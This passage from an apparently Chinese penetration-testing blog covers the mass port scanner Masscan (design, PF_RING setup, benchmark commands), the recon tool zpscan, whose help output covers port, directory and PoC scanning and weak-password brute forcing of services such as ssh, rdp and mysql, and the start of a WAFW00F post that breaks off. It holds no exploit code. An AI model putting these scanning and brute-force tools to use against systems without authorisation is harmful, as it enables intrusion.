<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">for (i = 0; i &lt; range; i++) &#123;</span><br><span class="line">    ip = pick(addresses, i);</span><br><span class="line">    scan(ip);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>Masscan 不仅支持 IP 地址范围，还支持端口范围。这意味着我们需要从索引变量中选择 IP 地址和端口。这相当简单：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">range = ip_count * port_count;</span><br><span class="line">for (i = 0; i &lt; range; i++) &#123;</span><br><span class="line">    ip   = pick(addresses, i / port_count);</span><br><span class="line">    port = pick(ports,     i % port_count);</span><br><span class="line">    scan(ip, port);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>这导致代码的另一个昂贵部分。在 x86 CPU 上，除法&#x2F;取模指令大约需要 90 个时钟周期，即 30 纳秒。当以 1000 万个数据包&#x2F;秒的速率传输时，每个数据包只有 100 纳秒。我认为没有办法更好地优化它。但幸运的是，两个这样的操作可以同时执行，因此执行其中两个操作（如上所示）并不比执行一个更昂贵。</p>
<p>对于上述性能问题其实有一些简单的优化，但是它们都依赖于<code>i++</code>索引变量通过扫描逐一增加的事实。实际上，我们需要随机化这个变量。我们需要随机化所扫描的 IP 地址的顺序，否则我们将炸掉那些不是为这种速度水平构建的目标网络。我们需要将流量均匀地分布在目标上。</p>
<p>我们随机化的方式很简单，就是对索引变量进行加密。根据定义，加密是随机的，并在原始索引变量和输出之间创建 1 对 1 的映射。这意味着当我们线性遍历该范围时，输出 IP 地址是完全随机的。在代码中，这看起来像：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">range = ip_count * port_count;</span><br><span class="line">for (i = 0; i &lt; range; i++) &#123;</span><br><span class="line">    x = encrypt(i);</span><br><span class="line">    ip   = pick(addresses, x / port_count);</span><br><span class="line">    port = pick(ports,     x % port_count);</span><br><span class="line">    scan(ip, port);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>这也有很大的成本。由于范围的大小是不可预测的，而不是 2 的偶次幂，因此我们不能使用廉价的二进制技术，例如 AND (&amp;) 和 XOR (^)。相反，我们必须使用昂贵的运算，例如 MODULUS (%)。在我当前的基准测试中，加密变量需要 40 纳秒。</p>
<p>这种架构允许许多很酷的功能。例如，它支持“分片”。您可以设置 5 台机器，每台机器执行五分之一的扫描或 <code>range / shard_count</code>. 分片可以是多台机器，也可以是同一台机器上的多个网络适配器，甚至（如果您愿意）同一网络适配器上的多个 IP 源地址。</p>
<p>或者，您可以使用加密功能的“种子”或“密钥”，以便每次扫描时都会得到不同的顺序，例如<code>x = encrypt(seed, i)</code>。</p>
<p>我们还可以通过退出程序来暂停扫描，只需记住 的当前值<code>i</code>，然后重新启动即可。我在开发过程中经常这样做。我发现我的互联网扫描出了问题，所以我点击停止扫描，然后在修复错误后重新启动扫描。</p>
<p>另一个功能是重传&#x2F;重试。数据包有时会在 Internet 上丢失，因此您可以连续发送两个数据包。然而，丢弃一个数据包的东西可能会丢弃紧随其后的数据包。因此，您希望间隔大约 1 秒发送副本。这很简单。我们已经有一个“速率”变量，它是我们正在传输的每秒数据包的数量，因此重传函数只是用作<code>i + rate</code> 索引。这几天我要研究一下互联网，区分一下“背靠背”、“1秒”、“10秒”、“1分钟”这样的重传，看看有没有被丢弃的东西有什么区别。</p>
<h2 id="C10-可扩展性"><a href="#C10-可扩展性" class="headerlink" title="C10 可扩展性"></a>C10 可扩展性</h2><p>异步技术被称为“c10k 问题”的解决方案。Masscan 专为下一级别的可扩展性“C10M 问题”而设计。</p>
<p>C10M的解决方案是绕过内核。Masscan 中存在三种主要的内核绕过方式：</p>
<ul>
<li>自定义网络驱动程序</li>
<li>用户模式 TCP 堆栈</li>
<li>用户模式同步</li>
</ul>
<p>Masscan 可以使用 PF_RING DNA 驱动程序。该驱动程序 DMA 数据包直接从用户模式内存发送到网络驱动程序，零内核参与。这样，即使 CPU 速度较慢，软件也能以硬件允许的最大速率传输数据包。如果您在计算机中放置 8 个 10 Gbps 网卡，这意味着它可以以每秒 1 亿个数据包的速度传输。</p>
<p>Masscan 有自己的内置 TCP 堆栈，用于从 TCP 连接抓取横幅。这意味着它可以轻松支持 1000 万个并发 TCP 连接，当然前提是计算机有足够的内存。</p>
<p>Masscan 没有“互斥体”。现代互斥体（又名 futexes）主要是用户模式的，但它们有两个问题。第一个问题是它们导致缓存行在 CPU 之间快速来回跳动。第二个是，当存在争用时，它们会对内核进行系统调用，这会降低性能。程序快速路径上的互斥体严重限制了可伸缩性。相反，Masscan 使用“环”来同步事物，例如当接收线程中的用户模式 TCP 堆栈需要传输数据包而不干扰传输线程时。</p>
<h2 id="可移植性"><a href="#可移植性" class="headerlink" title="可移植性"></a>可移植性</h2><p>该代码在 Linux、Windows 和 Mac OS X 上运行良好。所有重要部分均采用标准 C (C90) 语言。因此，它在 Visual Studio 上使用 Microsoft 的编译器进行编译，在 Mac OS X 上使用 Clang&#x2F;LLVM 编译器进行编译，在 Linux 上使用 GCC 进行编译。</p>
<p>Windows 和 Mac 并未针对数据包传输进行调整，每秒只能传输约 300,000 个数据包，而 Linux 每秒可以传输 1,500,000 个数据包。无论如何，这可能比你想要的要快。</p>
<h2 id="安全码"><a href="#安全码" class="headerlink" title="安全码"></a>安全码</h2><p>针对漏洞提供赏金，请参阅 VULNINFO.md 文件以获取更多信息。</p>
<p>该项目使用诸如 之类的安全函数，<code>safe_strcpy()</code>而不是诸如 之类的不安全函数<code>strcpy()</code>。</p>
<p>该项目具有自动化单元回归测试 ( <code>make regress</code>)。</p>
<h2 id="兼容性"><a href="#兼容性" class="headerlink" title="兼容性"></a>兼容性</h2><p>我们付出了很多努力来使输入&#x2F;输出看起来像<code>nmap</code>，每个进行端口扫描的人都（或应该）熟悉这一点。</p>
<h2 id="IPv6-和-IPv4-共存"><a href="#IPv6-和-IPv4-共存" class="headerlink" title="IPv6 和 IPv4 共存"></a>IPv6 和 IPv4 共存</h2><p>Masscan支持IPv6，但没有特殊模式，两者同时支持。（没有<code>-6</code>选择——它总是可用的）。</p>
<p>在您看到的 Masscan 使用的任何示例中，只需将 IPv6 地址放在您看到的 IPv4 地址处即可。您可以在同一扫描中同时包含 IPv4 和 IPv6 地址。输出包括同一位置的适当地址，没有特殊标记。</p>
<p>请记住，IPv6 地址空间非常大。您可能不想扫描大范围，除了通过 DHCPv6 分配的子网的前 64k 地址。</p>
<p>相反，您可能需要扫描<code>--include-file filename.txt</code>从其他来源获得的文件 ( ) 中存储的大量地址列表。与其他地方一样，此文件可以包含 IPv4 和 IPv6 地址的列表。我使用的测试文件包含 800 万个地址。该大小的文件在启动时需要额外几秒钟的时间来读取（masscan 在扫描之前对地址进行排序并删除重复项）。</p>
<p>请记住，masscan 包含其自己的网络堆栈。因此，运行 Masscan 的本地计算机不需要启用 IPv6——尽管本地网络需要能够路由 IPv6 数据包。</p>
<h2 id="PF-RING"><a href="#PF-RING" class="headerlink" title="PF_RING"></a>PF_RING</h2><p>要获得超过 200 万个数据包&#x2F;秒，您需要一个 Intel 10-gbps 以太网适配器和一个来自 ntop 的名为<a target="_blank" rel="noopener" href="http://www.ntop.org/products/packet-capture/pf_ring/pf_ring-zc-zero-copy/">“PF_RING ZC”</a>的特殊驱动程序。无需重建 Masscan 即可使用 PF_RING。要使用 PF_RING，您需要构建以下组件：</p>
<ul>
<li><code>libpfring.so</code>（安装在&#x2F;usr&#x2F;lib&#x2F;libpfring.so中）</li>
<li><code>pf_ring.ko</code>（他们的内核驱动程序）</li>
<li><code>ixgbe.ko</code>（他们的 Intel 10-gbps 以太网驱动程序版本）</li>
</ul>
<p>您不需要构建他们的版本<code>libpcap.so</code>。</p>
<p>当 Masscan 检测到适配器的名称类似于 时<code>zc:enp1s0</code>，<code>enp1s0</code>它会自动切换到 PF_RING ZC 模式。</p>
<p><strong>更详细的讨论可以在PoC||GTFO 0x15</strong>中找到。</p>
<h2 id="回归测试"><a href="#回归测试" class="headerlink" title="回归测试"></a>回归测试</h2><p>该项目包含一个内置的单元测试：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ make test</span><br><span class="line">bin/masscan --selftest</span><br><span class="line">selftest: success!</span><br></pre></td></tr></table></figure>



<p>这测试了代码的许多棘手部分。您应该在构建后执行此操作。</p>
<h2 id="性能测试"><a href="#性能测试" class="headerlink" title="性能测试"></a>性能测试</h2><p>要测试性能，请对一次性地址运行类似以下内容，以避免本地路由器过载：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ bin/masscan 0.0.0.0/4 -p80 --rate 100000000 --router-mac 66-55-44-33-22-11</span><br></pre></td></tr></table></figure>



<p>伪造者<code>--router-mac</code>将数据包保留在本地网段上，这样它们就不会传到互联网上。</p>
<p>您还可以在“离线”模式下进行测试，这是程序在没有传输开销的情况下运行的速度：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ bin/masscan 0.0.0.0/4 -p80 --rate 100000000 --offline</span><br></pre></td></tr></table></figure>



<p>第二个基准测试大致显示了如果使用 PF_RING 程序的运行速度，其开销几乎为零。</p>
<p>顺便说一句，随机化算法大量使用“整数算术”，这是 CPU 上长期缓慢的运算。现代 CPU 已将执行此计算的速度提高了一倍，速度<code>masscan</code>更快。</p>
<h1 id="作者"><a href="#作者" class="headerlink" title="作者"></a>作者</h1><p>该工具由 Robert Graham 创建：电子邮件：<a href="mailto:&#x72;&#x6f;&#98;&#101;&#x72;&#116;&#95;&#100;&#97;&#x76;&#x69;&#100;&#x5f;&#103;&#x72;&#97;&#104;&#x61;&#x6d;&#x40;&#121;&#x61;&#x68;&#111;&#111;&#46;&#99;&#111;&#x6d;">robert_david_graham@yahoo.com</a> 推特：@ErrataRob</p>
<h1 id="执照"><a href="#执照" class="headerlink" title="执照"></a>执照</h1><p>版权所有 (c) 2013 罗伯特·大卫·格雷厄姆</p>
<p>该程序是免费软件：您可以根据自由软件基金会发布的 GNU Affero 通用公共许可证（许可证版本 3）的条款重新分发和&#x2F;或修改它。</p>
<p>分发此程序的目的是希望它有用，但不提供任何保证；甚至没有适销性或特定用途适用性的默示保证。有关更多详细信息，请参阅 GNU Affero 通用公共许可证。</p>
<p>您应该随该程序一起收到 GNU Affero 通用公共许可证的副本。如果没有，请参阅<a target="_blank" rel="noopener" href="https://www.gnu.org/licenses/%E3%80%82">https://www.gnu.org/licenses/。</a></p>

        </div>
    

</div>
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2025/01/18/zpscan-%E5%BE%88%E5%BC%BA%E5%8F%88%E5%A5%BD%E7%94%A8%E7%9A%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B7%A5%E5%85%B7/">
                zpscan-很强又好用的信息收集工具
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2025-01-18</span>
            
            
            
                <span class="category">
                    <a href="/categories/渗透/">渗透</a>
                </span>
            
        </div>
    </div>

    
        <div class="content">
            <h1 id="zpscan-综合性很强又很好用的信息收集工具"><a href="#zpscan-综合性很强又很好用的信息收集工具" class="headerlink" title="zpscan-综合性很强又很好用的信息收集工具!"></a>zpscan-综合性很强又很好用的信息收集工具!</h1><h2 id="github"><a href="#github" class="headerlink" title="github"></a>github</h2><p><a target="_blank" rel="noopener" href="https://github.com/niudaii/zpscan">https://github.com/niudaii/zpscan</a></p>
<h2 id="下载链接"><a href="#下载链接" class="headerlink" title="下载链接:"></a>下载链接:</h2><p><a target="_blank" rel="noopener" href="https://github.com/niudaii/zpscan/releases/tag/v1.8.39">https://github.com/niudaii/zpscan/releases/tag/v1.8.39</a></p>
<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><pre><code>	该工具集成domainscan、webscan、ipscan、crack、dirscan、pocscan、expscan直接一键启动开启信息收集省去了其他步骤。
</code></pre>
<h2 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h2><ul>
<li>domainscan<ul>
<li>调用 subfinder 被动收集，调用 ksubdoamin 进行 dns 验证</li>
<li>泛解析、CDN 判断</li>
<li>获取 domain 相关的 web（host:port）资产，使用 webscan 扫描</li>
</ul>
</li>
<li>webscan<ul>
<li>支持 http&#x2F;https scheme 自动判断</li>
<li>获取 statusCode、contentLength、favicon、iconHash、title、wappalyzer、finger</li>
<li>title 自动中文解码</li>
<li>js 静态分析跳转</li>
<li>favicon 自动分析获取 iconhash</li>
<li>指纹自定义 tags 用来过滤和标记，pocTags 与 pocscan 对应</li>
<li>联动模块（webscan -&gt; pocscan）</li>
</ul>
</li>
<li>ipscan<ul>
<li>支持多种输入格式（192.168.1.1-128）（192.168.1.0&#x2F;24）</li>
<li>先端口开放扫描（tcp），使用 nmap 指纹识别协议</li>
<li>获取地理位置</li>
<li>操作系统识别</li>
<li>联动模块（ipscan -&gt; webscan -&gt; crack）</li>
</ul>
</li>
<li>crack<ul>
<li>支持默认端口协议和自定义协议爆破（127.0.0.1:3306）（127.0.01:3307|mysql）</li>
<li>支持常见服务口令爆破、未授权检测（ ftp,ssh,wmi,wmihash,smb,mssql,oracle,mysql,rdp,postgres,redis,memcached,mongodb)</li>
<li>全部模块测试用例（爆破成功、失败、超时）</li>
</ul>
</li>
<li>dirscan<ul>
<li>字典分类</li>
<li>结果过滤（重复 contentLength 判断）</li>
</ul>
</li>
<li>pocscan<ul>
<li>支持多种 poc 格式（goby、xray、nuclei）</li>
<li>支持指定 tag 加载 poc</li>
</ul>
</li>
<li>expscan<ul>
<li>基于 nuclei 的 exp 框架，通过 variables 替换 payload，通过 extractors 匹配结果</li>
</ul>
</li>
</ul>
<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">➜  zpscan git:(main) ./zpscan -h</span><br><span class="line">一个有点好用的信息收集工具 by zp857</span><br><span class="line"></span><br><span class="line">Usage:</span><br><span class="line">  zpscan [command]</span><br><span class="line"></span><br><span class="line">Available Commands:</span><br><span class="line">  crack       常见服务弱口令爆破</span><br><span class="line">  dirscan     目录扫描</span><br><span class="line">  domainscan  子域名收集</span><br><span class="line">  help        Help about any command</span><br><span class="line">  ipscan      端口扫描</span><br><span class="line"> 	pocscan     poc扫描</span><br><span class="line">  webscan     web信息收集</span><br><span class="line"></span><br><span class="line">Flags:</span><br><span class="line">      --debug               show debug output</span><br><span class="line">  -h, --help                help for zpscan</span><br><span class="line">  -i, --input string        single input(example: -i &#x27;xxx&#x27;)</span><br><span class="line">  -f, --input-file string   inputs file(example: -f &#x27;xxx.txt&#x27;)</span><br><span class="line">      --no-color            disable colors in output</span><br><span class="line">  -o, --output string       output file to write found results (default &quot;result.txt&quot;)</span><br><span class="line"></span><br><span class="line">Use &quot;zpscan [command] --help&quot; for more information about a command.</span><br></pre></td></tr></table></figure>



<p>子命令（domainscan|ipscan|webscan|crack|dirscan|pocscan）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">➜  zpscan git:(main) ./zpscan crack -h                       </span><br><span class="line">常见服务弱口令爆破,支持ftp,ssh,wmi,wmihash,smb,mssql,oracle,mysql,rdp,postgres,redis,memcached,mongodb</span><br><span class="line"></span><br><span class="line">Usage:</span><br><span class="line">  zpscan crack [flags]</span><br><span class="line"></span><br><span class="line">Flags:</span><br><span class="line">      --crack-all          crack all user:pass</span><br><span class="line">      --delay int          delay between requests in seconds (0 to disable)</span><br><span class="line">  -h, --help               help for crack</span><br><span class="line">  -m, --module string      choose one module to crack(ftp,ssh,wmi,mssql,oracle,mysql,rdp,postgres,redis,memcached,mongodb) (default &quot;all&quot;)</span><br><span class="line">      --pass string        pass(example: --pass &#x27;admin,root&#x27;)</span><br><span class="line">      --pass-file string   pass file(example: --pass-file &#x27;pass.txt&#x27;)</span><br><span class="line">      --threads int        number of threads (default 1)</span><br><span class="line">      --timeout int        timeout in seconds (default 10)</span><br><span class="line">      --user string        user(example: --user &#x27;admin,root&#x27;)</span><br><span class="line">      --user-file string   user file(example: --user-file &#x27;user.txt&#x27;)</span><br><span class="line"></span><br><span class="line">Global Flags:</span><br><span class="line">      --debug               show debug output</span><br><span class="line">  -i, --input string        single input(example: -i &#x27;xxx&#x27;)</span><br><span class="line">  -f, --input-file string   inputs file(example: -f &#x27;xxx.txt&#x27;)</span><br><span class="line">      --no-color            disable colors in output</span><br><span class="line">  -o, --output string       output file to write found results (default &quot;result.txt&quot;)</span><br><span class="line">[INF] 运行时间: 545.655µs</span><br></pre></td></tr></table></figure>



<h2 id="截图"><a href="#截图" class="headerlink" title="截图"></a>截图</h2><p>domainscan</p>
<p><a target="_blank" rel="noopener" href="https://camo.githubusercontent.com/967a9257bf972e52a373a3af67cca0d727d541f56d5b9968891abb2aca4b655b/68747470733a2f2f6e6e6f7465732e6f73732d636e2d68616e677a686f752e616c6979756e63732e636f6d2f6e6f7465732f696d6167652d32303232303932303130303932383732322e706e67"><img src="https://camo.githubusercontent.com/967a9257bf972e52a373a3af67cca0d727d541f56d5b9968891abb2aca4b655b/68747470733a2f2f6e6e6f7465732e6f73732d636e2d68616e677a686f752e616c6979756e63732e636f6d2f6e6f7465732f696d6167652d32303232303932303130303932383732322e706e67" alt="image-20220920100928722"></a></p>
<p>ipscan</p>
<p><a target="_blank" rel="noopener" href="https://camo.githubusercontent.com/949d8fc9c82cebc92c427810a0a8da3559a066af6ed7fed13b6bbd5a8200d88d/68747470733a2f2f6e6e6f7465732e6f73732d636e2d68616e677a686f752e616c6979756e63732e636f6d2f6e6f7465732f696d6167652d32303232303932303130313132323931392e706e67"><img src="https://camo.githubusercontent.com/949d8fc9c82cebc92c427810a0a8da3559a066af6ed7fed13b6bbd5a8200d88d/68747470733a2f2f6e6e6f7465732e6f73732d636e2d68616e677a686f752e616c6979756e63732e636f6d2f6e6f7465732f696d6167652d32303232303932303130313132323931392e706e67" alt="image-20220920101122919"></a></p>
<p>webscan</p>
<p><a target="_blank" rel="noopener" href="https://camo.githubusercontent.com/3330122f0616cfde8541bf1438750a8572cc4628758125cac69de1530c5fb4fb/68747470733a2f2f6e6e6f7465732e6f73732d636e2d68616e677a686f752e616c6979756e63732e636f6d2f6e6f7465732f696d6167652d32303232303931363133343333303537352e706e67"><img src="https://camo.githubusercontent.com/3330122f0616cfde8541bf1438750a8572cc4628758125cac69de1530c5fb4fb/68747470733a2f2f6e6e6f7465732e6f73732d636e2d68616e677a686f752e616c6979756e63732e636f6d2f6e6f7465732f696d6167652d32303232303931363133343333303537352e706e67" alt="image-20220916134330575"></a></p>
<p>crack</p>
<p><a target="_blank" rel="noopener" href="https://camo.githubusercontent.com/782b30fa2f2109770980e157259bc1143c569f44db6e60d47f5e15d7354572c2/68747470733a2f2f6e6e6f7465732e6f73732d636e2d68616e677a686f752e616c6979756e63732e636f6d2f6e6f7465732f696d6167652d32303232303931363133343433333930382e706e67"><img src="https://camo.githubusercontent.com/782b30fa2f2109770980e157259bc1143c569f44db6e60d47f5e15d7354572c2/68747470733a2f2f6e6e6f7465732e6f73732d636e2d68616e677a686f752e616c6979756e63732e636f6d2f6e6f7465732f696d6167652d32303232303931363133343433333930382e706e67" alt="image-20220916134433908"></a></p>
<p>dirscan</p>
<p><a target="_blank" rel="noopener" href="https://camo.githubusercontent.com/6ca9a82ebf9d4ef6a509a155faac77371e70a05700a48dc487ddb3e33dbb7f15/68747470733a2f2f6e6e6f7465732e6f73732d636e2d68616e677a686f752e616c6979756e63732e636f6d2f6e6f7465732f696d6167652d32303232303932303130313330383434392e706e67"><img src="https://camo.githubusercontent.com/6ca9a82ebf9d4ef6a509a155faac77371e70a05700a48dc487ddb3e33dbb7f15/68747470733a2f2f6e6e6f7465732e6f73732d636e2d68616e677a686f752e616c6979756e63732e636f6d2f6e6f7465732f696d6167652d32303232303932303130313330383434392e706e67" alt="image-20220920101308449"></a></p>
<p>pocscan</p>
<p><a target="_blank" rel="noopener" href="https://camo.githubusercontent.com/3ececd4fedfa45ff4fb83ac3da263d4f274e1c918721150138a6de68a2c187c6/68747470733a2f2f6e6e6f7465732e6f73732d636e2d68616e677a686f752e616c6979756e63732e636f6d2f6e6f7465732f696d6167652d32303233303432323139323033333737382e706e67"><img src="https://camo.githubusercontent.com/3ececd4fedfa45ff4fb83ac3da263d4f274e1c918721150138a6de68a2c187c6/68747470733a2f2f6e6e6f7465732e6f73732d636e2d68616e677a686f752e616c6979756e63732e636f6d2f6e6f7465732f696d6167652d32303233303432323139323033333737382e706e67" alt="image-20230422192033778"></a></p>
<p>expscan</p>
<p><a target="_blank" rel="noopener" href="https://camo.githubusercontent.com/c84c3b6e1b0b14c6c8f34a2083ddaa276bf981fe101dd67391292077eddc8073/68747470733a2f2f6e6e6f7465732e6f73732d636e2d68616e677a686f752e616c6979756e63732e636f6d2f6e6f7465732f696d6167652d32303233303432323139323632333934392e706e67"><img src="https://camo.githubusercontent.com/c84c3b6e1b0b14c6c8f34a2083ddaa276bf981fe101dd67391292077eddc8073/68747470733a2f2f6e6e6f7465732e6f73732d636e2d68616e677a686f752e616c6979756e63732e636f6d2f6e6f7465732f696d6167652d32303233303432323139323632333934392e706e67" alt="image-20230422192623949"></a></p>
<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><ul>
<li><p>下载并放置资源文件（config.yaml、resource&#x2F;）到可执行文件的同目录下</p>
<p><a target="_blank" rel="noopener" href="https://niudaii.oss-cn-hangzhou.aliyuncs.com/resource.zip">https://niudaii.oss-cn-hangzhou.aliyuncs.com/resource.zip</a></p>
</li>
</ul>
<h2 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h2><p>2023-01-04</p>
<ul>
<li>改进 domainscan 模块的 subfinder 模块</li>
<li>改进 dirscan 模块，根据 url 自动补充字典</li>
</ul>
<p>2022-12-21</p>
<ul>
<li>增加 exp 模块（nuclei），支持走代理扫描</li>
</ul>
<p>2022-11-10</p>
<ul>
<li>增加 pocscan 模块</li>
</ul>
<h3 id="TODO"><a href="#TODO" class="headerlink" title="TODO"></a>TODO</h3><ul>
<li>子域名存在泛解析时爆破方式：使用 TTL 判断</li>
</ul>
<h2 id="Q-A"><a href="#Q-A" class="headerlink" title="Q&amp;A"></a>Q&amp;A</h2><h4 id="1、linux操作系统端口扫描时出现：ping-err-socket-permission-denied"><a href="#1、linux操作系统端口扫描时出现：ping-err-socket-permission-denied" class="headerlink" title="1、linux操作系统端口扫描时出现：ping err, socket: permission denied"></a>1、linux操作系统端口扫描时出现：ping err, socket: permission denied</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo sysctl -w net.ipv4.ping_group_range=&quot;0 2147483647&quot;</span><br></pre></td></tr></table></figure>



<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://github.com/projectdiscovery/subfinder">https://github.com/projectdiscovery/subfinder</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/boy-hack/ksubdomain">https://github.com/boy-hack/ksubdomain</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/netxfly/x-crack">https://github.com/netxfly/x-crack</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/shadow1ng/fscan">https://github.com/shadow1ng/fscan</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/zu1k/nali">https://github.com/zu1k/nali</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/projectdiscovery/naabu">https://github.com/projectdiscovery/naabu</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/projectdiscovery/nuclei">https://github.com/projectdiscovery/nuclei</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/Ciyfly/woodpecker">https://github.com/Ciyfly/woodpecker</a></p>

        </div>
    

</div>
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2025/01/18/WAFW00F-%E5%A5%BD%E7%94%A8%E7%9A%84%E8%AF%86%E5%88%AB%E9%98%B2%E7%81%AB%E5%A2%99%E5%B7%A5%E5%85%B7/">
                WAFW00F-好用的识别防火墙工具
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2025-01-18</span>
            
            
            
                <span class="category">
                    <a href="/categories/渗透/">渗透</a>
                </span>
            
        </div>
    </div>

    
        <div class="content">
            <h2 id="它是如何工作的？"><a href="#它是如何工作的？" class="headerlink" title="它是如何工作的？"></a>它是如何工作的？</h2><p>github:<a target="_blank" rel="noopener" href="https://github.com/EnableSecurity/wafw00f">https://github.com/EnableSecurity/wafw00f</a></p>
<p>为了发挥其魔力，WAFW00F 执行以下操作：</p>
<ul>
<li>发送<em>正常的</em>HTTP请求并分析响应；这确定了许多 WAF 解决方案。</li>
<li>如果不成功，它会发送许多（可能是恶意的）HTTP 请求，并使用简单的逻辑来推断它是哪个 WAF。</li>
<li>如果也不成功，它会分析之前返回的响应，并使用另一种简单的算法来猜测 WAF 或安全解决方案是否正在积极响应我们的攻击。</li>
</ul>
<p><a target="_blank" rel="noopener" href="https://github.com/EnableSecurity/wafw00f">有关更多详细信息，请查看我们的主存储库</a>上的源代码。</p>
<h2 id="它检测到什么？"><a href="#它检测到什么？" class="headerlink" title="它检测到什么？"></a>它检测到什么？</h2><p>WAFW00F可以检测多种防火墙，列表如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span 